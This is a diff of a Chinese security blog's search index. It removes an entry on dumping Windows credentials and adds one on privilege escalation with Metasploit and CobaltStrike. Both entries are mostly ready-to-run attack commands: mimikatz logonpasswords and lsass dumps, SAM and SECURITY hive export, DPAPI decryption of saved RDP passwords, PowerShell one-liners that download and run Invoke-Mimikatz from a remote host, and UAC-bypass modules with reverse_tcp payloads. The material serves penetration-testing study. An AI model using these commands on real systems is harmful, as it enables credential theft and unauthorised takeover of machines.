-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
-<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
-<span id="more"></span>
-
-<p>Windows Hash格式：</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
-
-<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>2000</th>
-<th>xp</th>
-<th>2003</th>
-<th>Vista</th>
-<th>win7</th>
-<th>2008</th>
-<th>2012</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>NTLM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-</tr>
-</tbody></table>
-<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
-<ul>
-<li><p>本地认证：用户直接操作计算机登陆账户 </p>
-</li>
-<li><p>网络认证：远程连接到工作组中的某个设备 </p>
-</li>
-<li><p>域认证：登陆到域环境中的某个设备</p>
-</li>
-</ul>
-<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
-<li><p>用户输入密码 </p>
-</li>
-<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
-</li>
-<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
-</li>
-<li><p>匹配则登陆成功，不匹配则登陆失败</p>
-</li>
-</ul>
-<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
-<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
-<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
-</blockquote>
-<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
-
-<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
-<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
-
-<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
-<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
-<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
-<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<p>Procdump lsass 进程导出: </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p>然后使用mimikatz还原密码：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
-
-<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
-<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
-</blockquote>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
-<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
-
-<p>获取hash值</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
-<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
-</blockquote>
-<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
-<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
-<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
-<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
-<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
-</blockquote>
-<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
-<p>查看本地用户此目录下是否存有RDP密码文件：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
-<p>查看保存在本地的远程主机信息：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
-
-<p>选择一个密码文件对其进行解密：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
-
-<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据guidMasterKey找到对应的Masterkey：</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
-
-<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
-
-<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
-<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
-<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
-<ul>
-<li>“.frm” 是描述表结构的文件 </li>
-<li>“.MYD” 是表的数据文件 </li>
-<li>“.MYI” 是表数据文件中任何索引的数据树</li>
-</ul>
-<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
-<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
-<ul>
-<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
-<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
-</ul>
-<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
-<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
-<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
-<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
-<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
-</ul>
-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用burp进行暴力破解</title>
     <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
@@ -1764,6 +1576,65 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs			//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject					//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透框架提权</title>
+    <url>/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="渗透测试框架提权"><a href="#渗透测试框架提权" class="headerlink" title="渗透测试框架提权"></a>渗透测试框架提权</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Metasploit提权模块"><a href="#0x00-Metasploit提权模块" class="headerlink" title="0x00 Metasploit提权模块"></a>0x00 Metasploit提权模块</h3><h5 id="getsystem："><a href="#getsystem：" class="headerlink" title="getsystem："></a>getsystem：</h5><p>getsystem是由Metasploit-Framework提供的一个模块，它可以将一个管理帐户（通常为本地Administrator账 户）提升为本地SYSTEM帐户</p>
+<blockquote>
+<p>getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。</p>
+<p>getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。 </p>
+<p>Windows服务已启动，导致与命名管道建立连接。 </p>
+<p>该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。 </p>
+<p>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
+</blockquote>
+<h5 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC:"></a>bypassUAC:</h5><p>UAC：用户帐户控制（User Account Control），是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改 </p>
+<p>getsystem提权方式对于普通用户来说是失败的不可正常执行的，那么这种情况下就需要绕过系统UAC来进行 getsystem提权</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进程注入</span></span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> LHOST=<span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> session <span class="number">7</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/1.png"></p>
+<p>进入meterpreter后输入，成功能够获取system权限</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/2.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#内存注入</span></span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line"><span class="built_in">set</span> payload windows/<span class="number">86</span>/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST=<span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> session <span class="number">2</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#Eventvwr注册表项</span></span><br><span class="line">use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line"><span class="comment">#COM处理程序劫持</span></span><br><span class="line">use exploit/windows/local/bypassuac_comhijack</span><br></pre></td></tr></table></figure>
+
+<h5 id="kernel漏洞提权"><a href="#kernel漏洞提权" class="headerlink" title="kernel漏洞提权"></a>kernel漏洞提权</h5><p>搜索</p>
+<blockquote>
+<p> windows-kernel-exploits(Windows平台提权漏洞集合) </p>
+<p> <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/3.png"></p>
+<h5 id="unquoted-service-path"><a href="#unquoted-service-path" class="headerlink" title="unquoted_service_path"></a>unquoted_service_path</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/unquoted_service_path</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/4.png"></p>
+<h5 id="service-permissions"><a href="#service-permissions" class="headerlink" title="service_permissions"></a>service_permissions</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/service_permissions</span><br><span class="line"><span class="built_in">set</span> sessions <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/5.png"></p>
+<h5 id="always-install-elevated"><a href="#always-install-elevated" class="headerlink" title="always_install_elevated"></a>always_install_elevated</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/always_install_elevated</span><br><span class="line"><span class="built_in">set</span> sessions <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x01-CobaltStrike提权模块"><a href="#0x01-CobaltStrike提权模块" class="headerlink" title="0x01 CobaltStrike提权模块"></a>0x01 CobaltStrike提权模块</h3><h5 id="beacon-Elevate"><a href="#beacon-Elevate" class="headerlink" title="beacon - Elevate"></a>beacon - Elevate</h5><p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/6.png"></p>
+<h5 id="自用提权exe"><a href="#自用提权exe" class="headerlink" title="自用提权exe"></a>自用提权exe</h5><p>CS上传文件</p>
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/7.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">exexut <span class="literal">-Hc</span> <span class="operator">-f</span> CVE<span class="literal">-2019</span><span class="literal">-0803</span>.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/8.png"></p>
+<h5 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h5><blockquote>
+<p><a href="https://github.com/Tycx2ry/SweetPotato_CS">https://github.com/Tycx2ry/SweetPotato_CS</a></p>
+</blockquote>
 ]]></content>
       <categories>
         <category>渗透测试</category>
